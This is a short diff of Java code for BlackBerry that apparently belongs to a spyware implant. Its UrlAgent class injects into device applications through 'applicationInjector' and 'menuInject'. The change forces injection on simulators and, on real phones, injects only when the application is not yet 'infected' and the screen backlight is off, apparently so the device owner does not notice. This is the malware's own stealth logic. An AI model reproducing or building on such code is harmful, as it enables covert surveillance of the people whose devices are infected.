@@ -13,6 +13,7 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
+import net.rim.device.api.system.DeviceInfo;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -88,9 +89,13 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
         }
 
-        if (!applicationInjector.isInfected()) {
-            if (!Backlight.isEnabled()) {
-                menuInject();
+        if(DeviceInfo.isSimulator()){
+            menuInject();
+        }else{
+            if (!applicationInjector.isInfected()) {
+                if (!Backlight.isEnabled()) {
+                    menuInject();
+                }
             }
         }
     }
